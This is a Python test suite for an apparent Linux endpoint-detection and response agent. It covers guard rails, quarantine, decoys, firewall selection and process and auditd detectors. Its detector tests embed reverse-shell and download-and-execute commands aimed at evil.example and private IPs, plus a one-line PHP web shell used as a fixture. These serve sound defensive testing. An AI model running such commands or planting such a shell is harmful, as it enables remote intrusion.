"""
Tests for the AiBoO Linux response engine + the EDR-ish collectors.

    python3 tests/test_response.py
"""

import importlib.util
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from pathlib import Path

DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(DIR))


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, DIR / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


agent = _load("aiboo_linux_agent")
resp = _load("aiboo_linux_response")


def settings(**kw):
    st = agent.Settings(dry_run=True, endpoint_name="test-linux",
                        remote_url="http://127.0.0.1:4000")
    for k, v in kw.items():
        setattr(st, k, v)
    return st


def engine(**kw):
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-test-"))
    st = settings(**kw)
    return resp.ResponseEngine(st, lambda m, level="INFO": None, tmp), tmp


# --------------------------------------------------------------------------
# guard rails
# --------------------------------------------------------------------------

def test_read_only_mode_refuses_change_actions():
    eng, _ = engine(allow_response=False, response_dry_run=True)
    out = eng.execute("block_access", "45.95.147.3")
    assert out["status"] == "failed"
    assert "READ-ONLY" in out["message"]


def test_localhost_and_the_aiboo_server_are_never_blocked():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    for ip in ("127.0.0.1", "::1", "localhost", "127.0.0.5"):
        assert eng.block_ip(ip)["status"] == "failed", ip
    # the AiBoO server itself (127.0.0.1 in this test) is refused too
    assert eng.block_ip("127.0.0.1")["status"] == "failed"


def test_pseudo_lock_works_even_in_read_only_mode():
    """The decoy changes nothing on the server, so it is always allowed."""
    eng, _ = engine(allow_response=False)
    out = eng.pseudo_lock("test")
    assert out["status"] == "executed"
    port = out["metadata"]["decoy_port"]
    assert 32768 <= port <= 60999
    # connect to the decoy like an intruder would
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    banner = s.recv(64)
    s.sendall(b"admin:admin123\n")
    s.close()
    time.sleep(0.5)
    assert banner.startswith((b"SSH-", b"220", b"HTTP/1.1"))
    hits = [e for e in eng.drain_events() if e["kind"] == "decoy_hit"]
    assert hits, "the decoy must record the connection"
    assert hits[0]["port"] == port
    restore = eng.execute("restore_pseudo_lock", out["metadata"]["lock_id"])
    assert restore["status"] == "executed"
    assert not eng.active_decoys()


def test_protected_processes_are_refused():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    assert eng.terminate_process("1")["status"] == "failed"          # PID 1
    assert eng.terminate_process("systemd")["status"] == "failed"
    assert eng.terminate_process("not-a-real-process-xyz")["status"] == "failed"


def test_system_accounts_and_root_are_never_locked():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    for user in ("root", "daemon", "no-such-user-abc"):
        out = eng.lock_user(user, 30)
        assert out["status"] == "failed", user
    # the account the agent runs as is refused as well
    me = os.environ.get("USER") or ""
    if me:
        assert eng.lock_user(me, 30)["status"] == "failed"


def test_unknown_action_is_reported_clearly():
    eng, _ = engine(allow_response=True)
    out = eng.execute("quarantine_device_xyz", "1.2.3.4")
    assert out["status"] == "failed"
    assert "not supported by the Linux agent" in out["message"]


# --------------------------------------------------------------------------
# dry-run behaviour + the audit log
# --------------------------------------------------------------------------

def test_dry_run_blocks_nothing_but_is_recorded():
    eng, tmp = engine(allow_response=True, response_dry_run=True)
    out = eng.execute("block_access", "45.95.147.3", {"reason": "test"})
    assert out["status"] == "executed"
    assert "dry-run" in out["message"].lower() or out["metadata"]["dry_run"] is True
    log = (Path(tmp) / "actions.jsonl").read_text().strip().splitlines()
    assert log and json.loads(log[-1])["action"] == "block_access"
    assert json.loads(log[-1])["target"] == "45.95.147.3"


def test_capabilities_are_reported():
    eng, _ = engine()
    caps = eng.capabilities()
    for key in ("allow_response", "root", "sudo_nopasswd", "can_change", "tools"):
        assert key in caps
    assert isinstance(caps["tools"], dict)


# --------------------------------------------------------------------------
# quarantine / restore (real file moves inside a temp folder)
# --------------------------------------------------------------------------

def test_quarantine_refuses_paths_outside_the_allowed_folders():
    eng, _ = engine(allow_response=True, response_dry_run=True, watch_dirs="")
    out = eng.execute("quarantine_file", "/etc/shadow")
    assert out["status"] == "failed"
    assert "outside the allowed folders" in out["message"]


def test_quarantine_and_restore_a_real_file():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-quar-"))
    watch = tmp / "webroot"
    watch.mkdir()
    shell = watch / "upload.php"
    shell.write_text("<?php system($_GET['c']); ?>")
    eng, _ = engine(allow_response=True, response_dry_run=False,
                    watch_dirs=str(watch), quarantine_dir=str(tmp / "q"))
    out = eng.execute("quarantine_file", str(shell), {"reason": "web shell"})
    assert out["status"] == "executed", out
    assert not shell.exists(), "the file must be moved away"
    assert out["metadata"]["sha256"]
    # restore by original path
    back = eng.execute("restore_file", str(shell))
    assert back["status"] == "executed", back
    assert shell.exists()


def test_quarantine_refuses_symlinks():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-quar-"))
    watch = tmp / "webroot"
    watch.mkdir()
    real = watch / "real.txt"
    real.write_text("x")
    link = watch / "link.txt"
    link.symlink_to(real)
    eng, _ = engine(allow_response=True, response_dry_run=False,
                    watch_dirs=str(watch), quarantine_dir=str(tmp / "q"))
    out = eng.execute("quarantine_file", str(link))
    assert out["status"] == "failed" and "symlink" in out["message"]


def test_restore_reports_when_nothing_matches():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    out = eng.execute("restore_file", "deadbeef")
    assert out["status"] == "failed" and "nothing in quarantine" in out["message"]


# --------------------------------------------------------------------------
# users: restriction timer
# --------------------------------------------------------------------------

def test_restriction_timer_is_written_and_reported_due():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    eng._schedule_unlock("someuser", 0.001)          # 0.001 min = 60 ms
    time.sleep(0.2)
    assert "someuser" in eng.restrictions_due()


# --------------------------------------------------------------------------
# EDR collectors
# --------------------------------------------------------------------------

def test_reverse_shell_patterns():
    bad = [
        "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1",
        "nc -e /bin/sh 10.0.0.9 4444",
        "curl http://evil.example/x.sh | bash",
        "wget -qO- http://evil.example/y.sh | sh",
        "python3 -c import socket,subprocess",
        "socat TCP:1.2.3.4:9001 EXEC:/bin/bash",
        "mkfifo /tmp/f; cat /tmp/f | sh -i",
        "chmod +x /tmp/linux-exploit",
    ]
    for cmd in bad:
        assert agent.REVERSE_SHELL_RE.search(cmd), cmd
    for cmd in ("/usr/sbin/nginx: worker process", "python3 aiboo_linux_agent.py",
                "systemd-journald", "postgres: writer process"):
        assert not agent.REVERSE_SHELL_RE.search(cmd), cmd


def test_running_reverse_shell_process_is_detected():
    """Spawn a real process with a C2-looking command line and find it."""
    proc = subprocess.Popen([sys.executable, "-c", "import socket,subprocess,time; time.sleep(30)"])
    try:
        time.sleep(0.4)
        st = settings()
        state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
        state.counters.now = time.time()
        found = agent.detect_suspicious_processes(st, state)
        assert any(f.pattern == "reverse_shell" and str(proc.pid) in f.summary for f in found), \
            f"pid {proc.pid} should be reported"
    finally:
        proc.kill()


def test_miner_and_tool_markers():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    assert "xmrig" in agent.TOOL_MARKERS
    assert "sqlmap" in agent.TOOL_MARKERS
    assert state.already_sent("nothing") is False


def test_auditd_execve_record_is_parsed():
    # a real auditd line shape: proctitle is hex, argv is a1=../a2=..
    title = b"bash -i >& /dev/tcp/10.0.0.9/4444".hex()
    line = ('type=EXECVE msg=audit(1700000000.123:456): argc=3 a0="bash" a1="-i" '
            f'a2=">&" proctitle={title}')
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    state.counters.now = time.time()
    out = agent.detect_audit_line(line, st, state, "/var/log/audit/audit.log")
    assert out and out[0].pattern == "reverse_shell"
    assert "10.0.0.9" in out[0].summary or "/dev/tcp" in out[0].summary


def test_auditd_ptrace_is_process_injection():
    line = ('type=SYSCALL msg=audit(1700000001.1:457): arch=c000003e syscall=101 '
            'success=yes exit=0 pid=4242 comm="gdb" exe="/usr/bin/gdb" key="ptrace"')
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    state.counters.now = time.time()
    out = agent.detect_audit_line(line, st, state, "audit.log")
    assert any(f.pattern == "process_injection" for f in out)


def test_auditd_root_execution_from_tmp_is_flagged():
    line = ('type=SYSCALL msg=audit(1700000002.1:458): syscall=execve success=yes exit=0 '
            'uid=0 pid=5000 comm="kworker" exe="/tmp/.hidden/x" key="exec"')
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    state.counters.now = time.time()
    out = agent.detect_audit_line(line, st, state, "audit.log")
    assert any(f.pattern == "dropped_file" for f in out)


def test_integrity_finds_a_new_web_shell():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-watch-"))
    (tmp / "index.html").write_text("ok")
    st = settings(watch_dirs=str(tmp))
    state = agent.AgentState(tmp / "state.json")
    state.counters.now = time.time()
    first = agent.detect_integrity(st, state)
    assert first == []                      # nothing dangerous yet
    (tmp / "shell.php").write_text("<?php system($_GET['c']); ?>")
    found = agent.detect_integrity(st, state)
    assert any(f.pattern == "dropped_file" and "shell.php" in f.summary for f in found)
    assert found[0].extra["sha256"]


def test_integrity_does_not_report_the_same_file_twice():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-watch-"))
    (tmp / "x.sh").write_text("echo hi")
    st = settings(watch_dirs=str(tmp))
    state = agent.AgentState(tmp / "state.json")
    state.counters.now = time.time()
    assert agent.detect_integrity(st, state)
    assert agent.detect_integrity(st, state) == []


# --------------------------------------------------------------------------
# firewall tool selection - a rule in a switched-off ufw drops NOTHING
# --------------------------------------------------------------------------

def _with_fake_system(tools, ufw_active, fn):
    real_which, real_active = resp.shutil.which, resp.ResponseEngine._ufw_active
    resp.shutil.which = lambda name: f"/usr/sbin/{name}" if name in tools else None
    resp.ResponseEngine._ufw_active = lambda self: ufw_active
    try:
        return fn()
    finally:
        resp.shutil.which, resp.ResponseEngine._ufw_active = real_which, real_active


def test_ufw_active_is_used_when_it_really_filters():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    real_run = eng._run
    eng._run = lambda cmd: (ran.append(cmd), (0, "Rule added"))[1]
    try:
        tool = _with_fake_system({"ufw"}, True, eng._firewall_tool_preferred)
    finally:
        eng._run = real_run
    assert tool == "ufw", tool


def test_switched_off_ufw_falls_back_to_iptables():
    """The EC2 case: ufw installed but inactive -> AiBoO must not silently 'block'."""
    eng, _ = engine(allow_response=True, response_dry_run=False)
    tool = _with_fake_system({"ufw", "iptables"}, False, eng._firewall_tool_preferred)
    assert tool == "iptables", tool

    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
    out = _with_fake_system({"ufw", "iptables"}, False,
                            lambda: eng.block_ip("45.95.147.3", "test"))
    assert out["status"] == "executed", out
    assert out["metadata"]["tool"] == "iptables", out["metadata"]
    assert any(c[:1] == ["iptables"] and "INPUT" in c for c in ran), ran
    assert any(c[:1] == ["iptables"] and "OUTPUT" in c for c in ran), ran


def test_ufw_only_and_inactive_blocks_but_warns_loudly():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, "Rule added"))[1]
    out = _with_fake_system({"ufw"}, False, lambda: eng.block_ip("45.95.147.3", "test"))
    assert out["status"] == "executed", out
    assert "NOT enabled" in out["message"], out["message"]
    assert out["metadata"]["enforced"] is False, out["metadata"]


def test_block_then_unblock_use_the_same_tool():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
    _with_fake_system({"ufw", "iptables"}, False, lambda: eng.block_ip("45.95.147.3"))
    _with_fake_system({"ufw", "iptables"}, False, lambda: eng.unblock_ip("45.95.147.3"))
    iptables_calls = [c for c in ran if c[0] == "iptables"]
    ufw_calls = [c for c in ran if c[0] == "ufw"]
    assert iptables_calls and not ufw_calls, (iptables_calls, ufw_calls)
    assert any("-D" in c for c in iptables_calls), iptables_calls


if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if not name.startswith("test_") or not callable(fn):
            continue
        try:
            fn()
            passed += 1
            print(f"PASS  {name}")
        except AssertionError as exc:
            failed += 1
            print(f"FAIL  {name}: {exc}")
        except Exception as exc:                                  # noqa: BLE001
            failed += 1
            print(f"ERROR {name}: {type(exc).__name__}: {exc}")
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
